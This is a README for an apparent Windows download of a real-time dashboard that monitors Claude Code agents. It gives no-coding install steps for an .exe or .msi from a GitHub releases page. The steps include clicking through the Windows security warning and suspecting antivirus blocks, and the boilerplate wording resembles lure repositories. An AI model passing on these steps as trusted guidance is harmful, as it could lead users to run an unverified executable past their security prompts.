# ⚙️ Claude-Code-Agent-Monitor - Real-Time Agent Monitoring Dashboard

[![Download Claude-Code-Agent-Monitor](https://img.shields.io/badge/Download-Claude--Code--Agent--Monitor-red?style=for-the-badge)](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor)

## 📋 Overview

Claude-Code-Agent-Monitor is a tool that shows what Claude Code agents are doing in real time. It uses a clean web interface built with React and connects to a backend powered by Node.js and Express. The system uses WebSockets to keep the information fresh without needing to refresh the page. You will see active sessions, what each agent is working on, the tools they use, and the status of subagents. The dashboard also has a Kanban view and sends notifications for status changes.

This guide explains how to download, install, and run it on a Windows computer. No coding skills are needed.

---

## 💻 System Requirements

- Windows 10 or later (64-bit recommended)
- At least 4 GB of RAM
- 2 GHz dual-core processor or better
- 5 GB of free disk space
- Internet connection to download files and access the dashboard
- A modern web browser (Chrome, Edge, Firefox, or similar)

---

## 🌐 What You Need Before Starting

1. A Windows PC meeting the system requirements above.
2. Access to the internet.
3. No additional software installs are required by users. This package includes all needed components.

---

## 🚀 Getting Started: Download and Installation

You will get the full package ready for use from the GitHub page. Follow these steps carefully.

### Step 1: Visit the Download Page

Click the link below or copy it into your web browser. This takes you to the official project page where you will download the software.  

[Download Claude-Code-Agent-Monitor](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor)

### Step 2: Find the Latest Release

On the GitHub page, find the section labeled `Releases`. This is where the software versions are stored. Usually, the latest stable release will appear at the top.

### Step 3: Download the Windows Installer

Look for a file that ends with `.exe` or `.msi`. This file is the Windows installer. Click on it to start downloading. The file size might be a few hundred megabytes depending on updates.

### Step 4: Run the Installer

Once the download finishes, open the file by double-clicking it. You might see a warning from Windows asking you to confirm running the installer. Choose Yes or Run.

Follow the installation prompts. Most options can be left as default. Set the installation path if you want, or keep the default folder.

### Step 5: Finish Installation

The installer copies files and sets up the program on your PC. Wait for the process to complete. When done, checkmark “Start Claude-Code-Agent-Monitor” if available, then click Finish.

---

## ▶️ How To Run Claude-Code-Agent-Monitor

### Starting the Program

If you did not start the program immediately after installation, find the icon on your Desktop or in the Start menu. Click it once to open the program.

### Accessing the Dashboard

The program runs a local web server on your PC. It opens your default browser automatically and loads the dashboard interface.

If it does not open automatically, open a browser and type:

```
http://localhost:3000
```

Press Enter to load the dashboard.

The dashboard page shows real-time data about agent sessions, their current tasks, and overall system status.

---

## 🛠 Understanding the Interface

### Live Analytics

The largest panel displays live updates about active sessions. You can see each agent’s name, their current task, and time spent on it.

### Kanban Board

This board shows agent tasks in stages like To Do, In Progress, and Done. You can drag and drop items to update status.

### Notifications

Pop-up messages appear when a significant event happens, such as when an agent completes a task or a new session starts.

### Tool Usage

A dedicated section shows which tools agents are using most. This helps track resource usage and optimize workflow.

---

## 🔧 Basic Maintenance

- Keep the program updated by checking the Releases page regularly.
- Restart the program if you notice delays or the dashboard freezes.
- Restarting your computer also helps clear any network or system issues.

---

## 🔄 Updating Claude-Code-Agent-Monitor

When new versions are released:

1. Visit the [GitHub Releases](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor/releases) page.
2. Download the latest `.exe` or `.msi` file.
3. Run it and follow installation prompts.
4. The installer will update your current version without removing settings.

---

## ⛑ Troubleshooting

If the program does not start, try these steps:

- Check if your Windows firewall or antivirus is blocking the app.
- Make sure you have installed all Windows updates.
- Confirm no other programs are using port 3000 on your PC.
- Reboot your PC and open the program again.
- If the web page does not load, try this URL on your browser again: `http://localhost:3000`

If problems continue, check the Issues section on the project GitHub page for help.

---

## 📂 File Locations and Logs

- Installed files go to the folder you specified during installation.
- Configuration files and logs are stored inside a `config` folder where the program is installed.
- Logs record information about the program operation and errors.

---

## 🚀 Quick Start Reference

1. Download the Windows installer from [here](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor).
2. Run the installer.
3. Launch the program from the Desktop or Start menu.
4. Open the dashboard in your browser at `http://localhost:3000`.
5. Watch live data and use the interface.

---

[![Download Claude-Code-Agent-Monitor](https://img.shields.io/badge/Download-Claude--Code--Agent--Monitor-brightgreen?style=for-the-badge)](https://github.com/FaizanAliMalik/Claude-Code-Agent-Monitor)

---

## 📚 Additional Information About This Project

- Uses WebSockets for live updates.
- Backend written in Node.js and Express.
- Frontend built on React with Tailwind CSS for styling.
- Stores data locally using SQLite.
- Monitors Claude Code agents and subagent activity.
- Displays alerts and notifications based on agent status.

---

## ⚙️ Support and Contribution

This project is open-source. You can report bugs or request features on GitHub. Contributions require understanding of Node.js and React codebases and are processed through pull requests.

---

## 🏷 Topics and Tags

ai-agents, claude-agents, claude-code, claude-skills, express, expressjs, http, node, nodejs, python, react, rest-api, rfc-6455, sqlite, sqlite3, tailwind, tailwindcss, typescript, vite, websocket